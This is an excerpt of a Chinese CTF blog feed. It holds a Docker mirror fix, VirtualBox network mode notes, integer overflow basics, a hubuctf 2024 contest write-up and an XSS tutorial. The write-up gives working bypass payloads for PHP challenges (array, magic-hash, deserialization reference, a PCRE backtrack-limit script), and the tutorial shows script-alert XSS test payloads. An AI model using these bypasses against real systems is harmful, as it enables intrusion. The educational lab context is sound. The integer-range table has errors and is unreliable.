class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;https://docker.211678.top&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.1panel.live&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://hub.rat.dev&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.m.daocloud.io&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://do.nark.eu.org&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://dockerpull.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://dockerproxy.cn&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.awsl9527.cn&quot;</span></span><br><span class="line">      ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.m.daocloud.io&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">:wq</span></span><br></pre></td></tr></table></figure><p>重启docker</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">system</span>ctl daemon-reload</span><br><span class="line"><span class="params">system</span>ctl restart  docker</span><br></pre></td></tr></table></figure><h2 id="五、Docker关闭不掉进程，Stopping-docker-service-but-it-can-still-be-activated-by-docker-socket"><a href="#五、Docker关闭不掉进程，Stopping-docker-service-but-it-can-still-be-activated-by-docker-socket" class="headerlink" title="五、Docker关闭不掉进程，Stopping docker.service, but it can still be activated by: docker.socket"></a>五、Docker关闭不掉进程，Stopping docker.service, but it can still be activated by: docker.socket</h2><p>解决方法：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker <span class="built_in">stop</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">stop</span> docker.<span class="built_in">socket</span></span><br></pre></td></tr></table></figure><p><strong>注意：1. 关闭终端重启会解决大部分问题。</strong></p><p><strong>2. 还有以下部分是权限问题，用sudo su切换成root模式</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机各种网络模式的区别</title>
      <link href="/posts/1324d72d.html"/>
      <url>/posts/1324d72d.html</url>
      
        <content type="html"><![CDATA[<p><strong>虚拟机各种网络模式的区别 NAT | NAT网络 | 桥接Bridged | 内部网络Internal | 仅主机(Host-Only)</strong></p><p><strong>模式一  NAT-网络地址转换</strong>：通过路由器的NAT功能给上网设备分配不同的私有地址，常见于大部分家庭网络，为VirtualBox的默认网络模式</p><p><strong>NAT工作流程</strong>：发送数据时NAT把私有地址转换为公有地址并可用端口进行标识，接收数据时NAT把公有地址转换为私有地址（私有地址有特定范围且不能被公有地址直接访问）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9a430a66a4ccaf9c01572bb2a9b1aac2c154de1d.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：VirtualBox虚拟出一台DHCP服务器并为虚拟机分配私有地址，虚拟机发出的数据在经过网关时通过里NAT改写数据包再通过宿主NAT转换发送到互联网，每个虚拟机都有同样的私有地址且虚拟机之间不可互通，虚拟机可访问宿主机但宿主机不可访问虚拟机（默认DHCP服务器和网关为10.0.2.2，私有地址为10.0.2.15）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/744b82bc579aff88c77261ebfbd77330a18e2d7f.png@1192w.webp" alt="img"></p><p><strong>模式二  NAT网络</strong>：与NAT的区别是通过在虚拟机上附加一台虚拟交换机实现虚拟机在NAT模式下互通</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/af61289e34d600c086ef7404cff0c39c03177140.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：VirtualBox虚拟出一台交换机附加在虚拟机上，虚拟机之间可互通，虚拟机可访问宿主机但宿主机不可访问虚拟机</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e0022982a39992eea61f462ed7483db965c95e83.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置NAT网络</strong>：</p><p>1.启用NAT网络：输入”名称”和”网络掩码”，勾选”启用DHCP”</p><p>2.配置网络模式：虚拟机找到设置-&gt;网络，”连接方式”选择”NAT网络”，”名称”选择上一步设置的网络名称（注意各虚拟机的MAC地址不应相同）</p><p><strong>模式三  桥接（桥接网卡）</strong>：虚拟机在宿主机所在的局域网中，通过宿主机使用的DHCP服务器获取IP地址</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/fd8f78aac71c26dfb19d2f7118c5a028cb1427c4.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：虚拟机通过宿主机使用的DHCP服务器获取IP地址，虚拟机间可互通，虚拟机和宿主机间可互通，互联网可访问虚拟机（需给虚拟机分配公网IP）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/23228e13557854d426fdb4174865be322f747a45.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置桥接模式</strong>：虚拟机找到设置-&gt;网络，”连接方式”选择”桥接网卡”，”名称”选择当前上网使用的网络连接（注意各虚拟机的MAC地址不应相同）</p><p><strong>模式四  内部网络</strong>：虚拟机和宿主机隔离，虚拟机使用内部的网络且无法访问外部网络和被外部网络访问</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/caef4843a152749cc368dc8153cb8d6a76217ce2.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：虚拟机间可互通，但虚拟机和宿主机/互联网无法互通，且VirtualBox默认不提供DHCP服务器需手动设置静态IP地址</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8478bde2fd377ab741f524b11fbd13f739c42007.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置内部网络</strong>：虚拟机找到设置-&gt;网络，”连接方式”选择”内部网络”，”名称”选择”internet”并手动给虚拟机配置IP地址</p><p><strong>模式五  仅主机</strong>：虚拟机和宿主机隔离，虚拟机使用提供宿主机提供的网络且无法访问外部网络和被外部网络访问</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1600825bab087d6274de6467c03dee5574e98984.png" alt="img"></p><p><strong>应用机制</strong>：虚拟机使用宿主机的虚拟DHCP服务器、虚拟网卡、虚拟交换机分配的IP地址，虚拟机间可互通，虚拟机和宿主机间可互通（虚拟机只能访问宿主机的虚拟网卡），虚拟机和互联网无法互通</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9b036d3be2d375a9a911faf4262b9506cff803f2.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置仅主机</strong>：</p><p>1.启用仅主机：输入”名称”、”掩码”、”最小地址”和”最大地址”</p><p>2.配置网络模式：虚拟机找到设置-&gt;网络，”连接方式”选择”仅主机”，”名称”选择上一步创建的网络名称</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整数溢出</title>
      <link href="/posts/704e6497.html"/>
      <url>/posts/704e6497.html</url>
      
        <content type="html"><![CDATA[<p>整数溢出的原理：</p><p>1.整数类型限制：<br>在计算机中，整数类型（如 int, short, long 等）都有固定的位宽（如 8 位、16 位、32 位、64 位等），这些位宽决定了整数能表示的最大值和最小值。<br>例如，对于一个 32 位有符号整数，其取值范围是 -2,147,483,648 到 2,147,483,647。</p><ol><li><p>溢出情况：<br> 1.正溢出：当结果值超过最大正整数时，会发生正溢出。例如，在 32 位有符号整数中，2,147,483,647 + 1 会导致结果变为 -2,147,483,648（环绕回最小      负数）。<br> 2.负溢出：当结果值低于最小负整数时，会发生负溢出。例如，在 32 位有符号整数中，-2,147,483,648 - 1 会导致结果变为 2,147,483,647（环绕回最大正数）。</p></li><li><p>操作示例：<br>假设我们有一个 8 位有符号整数，范围是 -128 到 127。<br>如果我们执行 127 + 1，结果应该是 128，但超出了 8 位整数的范围，因此实际结果会变为 -128（即发生正溢出）。<br>类似地，如果执行 -128 - 1，结果应该是 -129，但同样超出了范围，因此实际结果会变为 127（即发生负溢出）。</p></li></ol><p>各种数据类型对应的取值范围：</p><p>uint8 - 0-255<br>uint16 - 0-65535<br>uint32 - 0-4294967295<br>uint36 - 0-18446744073709551615<br>int8 - -127-128<br>int16 - -32768-32767<br>int32 - -2147483648-2147483647<br>int64 - -9223372036854775808-9223372036854775807 </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hubuctf-2024校赛-复现wp</title>
      <link href="/posts/70ec5c3.html"/>
      <url>/posts/70ec5c3.html</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="easyweb1"><a href="#easyweb1" class="headerlink" title="easyweb1"></a>easyweb1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;GZCTF_FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You are failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>利用intval()的性质,用数组绕过。构造payload</p></blockquote><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">num</span>[]=<span class="number">0</span></span><br></pre></td></tr></table></figure><blockquote><p>hubuctf{80446bef-905a-4f87-94b8-c01e573ab311}</p></blockquote><h4 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;GZCTF_FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>找个md5值和它本身的值弱相等的就行。网上能找到，平时可以多收集。</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">a</span>=0e215962017</span><br></pre></td></tr></table></figure><blockquote><p>hubuctf{c3ce23e3-016b-4f16-b701-343495750d74}</p></blockquote><h4 id="easyweb3"><a href="#easyweb3" class="headerlink" title="easyweb3"></a>easyweb3</h4><blockquote><p>考点：序列化反序列化</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;GZCTF_FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hubu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token= <span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hubu&#x27;</span>]);</span><br><span class="line"><span class="variable">$data</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这个token是个md5数，又要强比较，我有两个想法:<br>1.把token变成数组，password也变成数组，再进行反序列化，进行数组绕过。<br>2.找出mt-rand()在这次运行下随机生成的种子，预测下一个数，然后进行md5碰撞。</p><p>但是token后面又被赋值成md5值了，mt-rand（）函数又看不到输出值</p><p>所以这两个想法都不成立。</p><p>后来问了别人才知道，可以让password变量引用token变量，这样它们就是一样的值了。</p><p>构造payload</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hubu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token= <span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hubu</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>hubuctf{3c223411-3a5a-45f2-80a3-9bed82440ad0}</p></blockquote><h4 id="easyweb4"><a href="#easyweb4" class="headerlink" title="easyweb4"></a>easyweb4</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;GZCTF_FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?r1kka/is&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;77r1kka&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>preg_match()：其中的‘.’代表着匹配前面的单个字符，‘+’代表匹配一次或者是多次，‘+？’代表重复一次或者多次，尽可能的少重复；（大概就是匹配到<em>ctfshow，</em>代表任意字符，就会返回true）</p><p>stripos()函数：不区分大小写，返回子串在字符串中第一次出现的位置，位置是从0开始的；没有查找到，返回FALSE，stripos函数对于传递数组情况下，返回值为NULL，NULL!=FALSE</p><p>进行了一个String强制类型转换,意思就是不能用数组绕过了,所以用PCRE回溯次数限制.</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://challenge.hubuctf.cn:31393/&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;very&#x27;</span> * 250000 + <span class="string">&#x27;77r1kka&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">r = requests.post(<span class="attribute">url</span>=url, <span class="attribute">data</span>=data).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h4 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h4><blockquote><p>考点：二进制转16进制</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104202047294.png" alt="image-20241104202047294"></p><blockquote><p>先说正确做法：</p><p>将二进制转换成16进制，然后发现头是52 61 72 21，是个rar文件，直接提取文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104202232832.png" alt="image-20241104202232832"></p><blockquote><p>是个jpg文件，查看信息，就能找到一串码，解码就是flag。</p><p>ZmxhZ3swMWEyNWVhM2ZkNjM0OWM2ZTYzNWExZDAxOTZlNzVmYn0=</p><p>flag{01a25ea3fd6349c6e635a1d0196e75fb}</p><p>接下来说错误作法：</p><p>将二进制文件直接转换成图片</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104202413760.png" alt="image-20241104202413760"></p><blockquote><p>这个酷似二维码的图，我解了半天没解出来，明显思路错误。</p></blockquote><h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><blockquote><p>考点：流量分析</p><p>将文件放进wireshake分析，得到</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104202711499.png" alt="image-20241104202711499"></p><blockquote><p>7f表示退格，所以最后flag就是 flag{backd00Rmate}</p></blockquote><h4 id="reverse-me"><a href="#reverse-me" class="headerlink" title="reverse me"></a>reverse me</h4><blockquote><p>考点：文件逆序</p><p>根据题目提示和文件尾，将文件逆序，得到一张jpg文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104203420474.png" alt="image-20241104203420474"></p><blockquote><p>然后将图片左右旋转就能拿到flag。</p><p>flag{4f7548f93c7bef1dc6a0542cf04e796e}</p></blockquote><h4 id="try-it"><a href="#try-it" class="headerlink" title="try_it"></a>try_it</h4><blockquote><p>考点：压缩包爆破</p><p>压缩包里面有个flag.txt，但需要密码，直接进行字典爆破</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104203708464.png" alt="image-20241104203708464"></p><blockquote><p>输入密码找到flag文件，打开发现是个jsfuck码，解码就是flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241104203747540.png" alt="image-20241104203747540"></p><blockquote><p>flag{d7da7aeb-a3d6-4637-aff5-57ac9a00582b}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss漏洞</title>
      <link href="/posts/c84cebac.html"/>
      <url>/posts/c84cebac.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-漏洞验证相关概念"><a href="#1-漏洞验证相关概念" class="headerlink" title="1 漏洞验证相关概念"></a>1 漏洞验证相关概念</h2><p>1.常见概念<br>    POC：全称 ’ Proof of Concept ‘，中文 ’ 概念验证 ’ ，常指一段漏洞证明的代码。<br>    EXP：全称 ’ Exploit ‘，中文 ’ 利用 ‘，指利用系统漏洞进行攻击的动作。<br>    Payload：中文 ’ 有效载荷 ‘，指成功exploit之后，真正在目标系统执行的代码或指令。<br>    Shellcode：简单翻译 ’ shell代码 ‘，是Payload的一种。Shellcode也有很多种，包括正向的，反向                        的，甚至meterpreter。<br>2.POC与EXP对比<br>    POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害    的，Exp通常是有害的，有了POC，才有EXP。<br>3.Payload与Shellcode<br>    Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。<br>4.Payload与EXP<br>    同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。<br>5.Payload模块<br>    在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这    三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager    主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用S    tager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。</p><h2 id="2-XSS漏洞验证"><a href="#2-XSS漏洞验证" class="headerlink" title="2 XSS漏洞验证"></a>2 XSS漏洞验证</h2><p>2.1 常见POC<br>可以用一段简单的代码（POC）来验证与检查漏洞的存在，常见的用于验证XSS漏洞存在的POC如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-2-反射型XSS漏洞验证"><a href="#2-2-反射型XSS漏洞验证" class="headerlink" title="2.2 反射型XSS漏洞验证"></a>2.2 反射型XSS漏洞验证</h4><p>1.反射型XSS漏洞常存在于参数中。本实验在XSS-labs第一关做验证，点击网站直接开战：<a href="http://test.ctf8.com/level1.php?name=test">http://test.ctf8.com/level1.php?name=test</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a3dfa130bdf7aec647e41cf1c368fcd9.png" alt="在这里插入图片描述"></p><p>我们将URL中的参数修改为?name=111回车，可以看到弹出以下页面，并我们的内容显示在页面上，后续我们将测试此处是否存在反射型XSS漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6431d4d7f1005b1b62555821175cd6ae.png" alt="在这里插入图片描述"></p><p>我们将参数修改为?name=<script>alert(/xss/)</script>，测试是否触发弹窗。回车可以看到弹出窗口，说明网站后台未对输入参数进行过滤，存在漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c1f0ce03f14a350c61a069dc9b7fa20a.png" alt="在这里插入图片描述"></p><p>我们右键网页，点击查看源码，如下。由于该网页没有对输入输出内容做任何的检验与过滤，导致这种异常</p><p>的内容输出到客户端浏览器，浏览器对内容做解析时，将内容按script标签进行解析，故弹窗。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span 